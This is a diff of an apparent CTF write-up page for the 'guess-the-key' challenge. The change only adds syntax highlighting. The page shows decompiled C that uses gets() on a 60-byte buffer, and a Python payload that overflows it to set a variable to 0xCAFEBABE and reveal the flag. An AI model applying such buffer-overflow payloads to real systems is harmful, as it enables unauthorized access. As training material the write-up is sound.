@@ -5,6 +5,7 @@
 	<meta name="viewport" content="width=device-width, initial-scale=1.0" />
 	<title>RiceSec</title>
 
+	<link href="/writeups/css/prism-one-light.css" rel="stylesheet" />
 	<link rel="stylesheet" href="/writeups/css/style.css" />
 </head>
 
@@ -20,25 +21,9 @@
 <h1>guess-the-key</h1>
 
 <p>Decompiled:</p>
-<pre><code class="language-c">int func()
-{
-  char v1[60]; // [rsp+0h] [rbp-40h] BYREF
-  int v2; // [rsp+3Ch] [rbp-4h]
-
-  puts(&quot;Guess the correct key to win!&quot;);
-  v2 = -559038737;
-  printf(&quot;Enter the key: &quot;);
-  gets(v1);
-  if ( v2 == 0xCAFEBABE )
-    return system(&quot;cat flag.txt&quot;);
-  puts(&quot;Wrong Key&quot;);
-  return puts(&quot;Try again!&quot;);
-}
-</code></pre>
+<pre class="language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><br><span class="token punctuation">{</span><br>  <span class="token keyword">char</span> v1<span class="token punctuation">[</span><span class="token number">60</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-40h] BYREF</span><br>  <span class="token keyword">int</span> v2<span class="token punctuation">;</span> <span class="token comment">// [rsp+3Ch] [rbp-4h]</span><br><br>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Guess the correct key to win!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><br>  v2 <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">559038737</span><span class="token punctuation">;</span><br>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Enter the key: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span><br>  <span class="token function">gets</span><span class="token punctuation">(</span>v1<span class="token punctuation">)</span><span class="token punctuation">;</span><br>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v2 <span class="token operator">==</span> <span class="token number">0xCAFEBABE</span> <span class="token punctuation">)</span><br>    <span class="token keyword">return</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cat flag.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><br>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Wrong Key"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><br>  <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Try again!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><br><span class="token punctuation">}</span></code></pre>
 <p>Payload:</p>
-<pre><code class="language-py">import sys
-sys.stdout.buffer.write((b&quot;A&quot; * 60) + b&quot;\xbe\xba\xfe\xca&quot;)
-</code></pre>
+<pre class="language-py"><code class="language-py"><span class="token keyword">import</span> sys<br>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span><span class="token builtin">buffer</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">b"A"</span> <span class="token operator">*</span> <span class="token number">60</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b"\xbe\xba\xfe\xca"</span><span class="token punctuation">)</span></code></pre>
 
 
 
